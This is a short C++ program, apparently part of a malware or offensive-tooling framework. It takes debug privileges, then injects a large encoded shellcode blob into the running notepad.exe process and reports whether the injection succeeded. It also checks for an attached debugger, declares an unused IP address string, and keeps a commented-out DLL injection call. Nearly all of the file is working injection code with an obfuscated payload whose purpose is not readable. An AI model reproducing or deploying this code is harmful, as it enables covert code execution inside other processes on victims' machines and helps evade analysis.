#include <iostream>
#include "framework.h"

PCSTR cac_ip = "192.168.1.1";

int main() {
    std::cout << "Starting main\n";

    Process notepad = Memory::GetProcessByName("notepad.exe");
    Memory::GetDebugPrivileges();

   //notepad.InjectDLL(DLL("C:\\Users\\chase\\Desktop\\unnamed-framework\\src\\core\\x64\\Debug\\MSGDLL.dll"));

    unsigned char code[] = "\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef\xff\xff\xff\x48\xbb\xa7\xda\x99\x41\x52\xff\x1b\xbd\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x5b\x92\x1a\xa5\xa2\x17\xdb\xbd\xa7\xda\xd8\x10\x13\xaf\x49\xec\xf1\x92\xa8\x93\x37\xb7\x90\xef\xc7\x92\x12\x13\x4a\xb7\x90\xef\x87\x92\x12\x33\x02\xb7\x14\x0a\xed\x90\xd4\x70\x9b\xb7\x2a\x7d\x0b\xe6\xf8\x3d\x50\xd3\x3b\xfc\x66\x13\x94\x00\x53\x3e\xf9\x50\xf5\x9b\xc8\x09\xd9\xad\x3b\x36\xe5\xe6\xd1\x40\x82\x74\x9b\x35\xa7\xda\x99\x09\xd7\x3f\x6f\xda\xef\xdb\x49\x11\xd9\xb7\x03\xf9\x2c\x9a\xb9\x08\x53\x2f\xf8\xeb\xef\x25\x50\x00\xd9\xcb\x93\xf5\xa6\x0c\xd4\x70\x9b\xb7\x2a\x7d\x0b\x9b\x58\x88\x5f\xbe\x1a\x7c\x9f\x3a\xec\xb0\x1e\xfc\x57\x99\xaf\x9f\xa0\x90\x27\x27\x43\xf9\x2c\x9a\xbd\x08\x53\x2f\x7d\xfc\x2c\xd6\xd1\x05\xd9\xbf\x07\xf4\xa6\x0a\xd8\xca\x56\x77\x53\xbc\x77\x9b\xc1\x00\x0a\xa1\x42\xe7\xe6\x82\xd8\x18\x13\xa5\x53\x3e\x4b\xfa\xd8\x13\xad\x1f\x43\xfc\xfe\x80\xd1\xca\x40\x16\x4c\x42\x58\x25\xc4\x08\xec\x88\x68\x8f\xf8\xe9\xab\x41\x52\xbe\x4d\xf4\x2e\x3c\xd1\xc0\xbe\x5f\x1a\xbd\xa7\x93\x10\xa4\x1b\x43\x19\xbd\xb6\x86\x18\x43\x82\xd0\x5a\xe9\xee\x53\x7d\x0d\xdb\x0e\x5a\x07\xeb\xad\xbf\x46\xad\x2a\x57\x34\x4d\xb2\x98\x40\x52\xff\x42\xfc\x1d\xf3\x19\x2a\x52\x00\xce\xed\xf7\x97\xa8\x88\x1f\xce\xdb\xf5\x58\x1a\xd1\xc8\x90\xb7\xe4\x7d\xef\x53\x58\x00\xe8\x15\x14\x62\x47\x25\x4c\x09\xdb\x38\x71\xad\xe6\x82\xd5\xc8\xb0\xb7\x92\x44\xe6\x60\x00\xe4\x26\x9e\xe4\x68\xef\x5b\x5d\x01\x50\xff\x1b\xf4\x1f\xb9\xf4\x25\x52\xff\x1b\xbd\xa7\x9b\xc9\x00\x02\xb7\x92\x5f\xf0\x8d\xce\x0c\x63\x3f\x71\xb0\xfe\x9b\xc9\xa3\xae\x99\xdc\xf9\x83\x8e\x98\x40\x1a\x72\x5f\x99\xbf\x1c\x99\x29\x1a\x76\xfd\xeb\xf7\x9b\xc9\x00\x02\xbe\x4b\xf4\x58\x1a\xd8\x11\x1b\x00\xd3\xf0\x2e\x1b\xd5\xc8\x93\xbe\xa1\xc4\x6b\xe5\x1f\xbe\x87\xb7\x2a\x6f\xef\x25\x53\xca\x5c\xbe\xa1\xb5\x20\xc7\xf9\xbe\x87\x44\xeb\x08\x05\x8c\xd8\xfb\xf4\x6a\xa6\x20\x58\x0f\xd1\xc2\x96\xd7\x27\xbb\xdb\xd0\x19\xba\xb2\x8a\x1e\x06\xe0\xc9\xeb\x2e\x38\xff\x42\xfc\x2e\x00\x66\x94\x52\xff\x1b\xbd";

    if (!notepad.InjectShellcode(Shellcode(code)))
        std::cout << "Shellcode injection failed\n";
    else
        std::cout << "Shellcode injection suceeded\n";

    if (AntiDebug::CheckIsDebuggerPresent())
        std::cout << "FOUND DEBUGGER\n";
    else
        std::cout << "No debugger found\n";

    exit(0);
}
